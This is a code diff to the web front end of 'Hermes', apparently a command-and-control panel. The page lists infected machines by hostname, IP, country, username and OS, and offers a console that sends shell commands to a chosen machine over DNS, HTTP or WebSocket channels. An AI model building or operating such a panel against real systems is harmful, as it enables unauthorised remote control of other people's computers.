@@ -14,17 +14,39 @@
             <div>Hermes</div>
             <a href="/">main</a>
             <a href="/computer">computers</a>
-            <div>{{.Hostname}}</div>
         </div>
     </header>
     <div class="frame">
-        <p>{{.Hostname}}</p>
+        <div class="computersdiv"> 
+            <table>
+                <caption></caption>
+                <thead>
+                    <tr>
+                        <th>Hostname</th>
+                        <th>IP</th>
+                        <th>Country</th>
+                        <th>Username</th>
+                        <th>OS</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr style="selection-color: blue;">
+                        <td>{{.Hostname}}</td>
+                        <td>{{.Ip}}</td>
+                        <td>{{.Country}}</td>
+                        <td>{{.Username}}</td>
+                        <td>{{.Os}}</td>
+                    </tr>
+                </tbody>
+            </table> 
+        </div>
+        <p></p>
         <div id="console">
             <div id="output"></div>
             <div contenteditable="true" id="input">$ </div>
         </div>
-        <label for="conT">Connection Type:</label>
-        <select style="margin-top: 15px;" id="conT" name="conT">
+        <label for="connectionType">Connection Type:</label>
+        <select style="margin-top: 15px;" id="connectionType" name="connectionType">
             <option value="0">DNS</option>
             <option value="1">HTTP</option>
             <option value="2">WEBSOCKET</option>
@@ -36,6 +58,9 @@
     const input = document.getElementById('input');
     const output = document.getElementById('output');
     const hostname = "{{.Hostname}}";
+    const machineId = "{{.Id}}"
+	console.log(hostname);
+	console.log(machineId);
 
     input.addEventListener('keydown', function (event) {
         if (event.key === 'Enter') {
@@ -49,15 +74,14 @@
     });
 
     async function processCommand(command) {
-        const result = `${hostname}-session$ ${command}\n`;
-        const conT = document.getElementById("conT").value;
-        output.innerText += await performRequest(command,conT);
+        const connectionType = document.getElementById("connectionType").value;
+        output.innerText += await performRequest(command,connectionType);
         const consoleDiv = document.getElementById('console');
         consoleDiv.scrollTop = consoleDiv.scrollHeight;
     };
 
-    async function performRequest(argument,conT) {
-        const response = await fetch(`http://localhost:3000/interact/receiver/${conT}`, {
+    async function performRequest(argument, connectionType) {
+		    const response = await fetch(`/interact/${machineId}/receiver/${connectionType}`, {
             method: "POST",
             headers: {
                 "Content-Type": "application/x-www-form-urlencoded"
@@ -76,7 +100,7 @@
     }
 
     #console {
-        background-color: #1e1e1e;
+        background-color: #4d4d4d;
         border: 1px solid #888;
         padding: 10px;
         height: 400px;
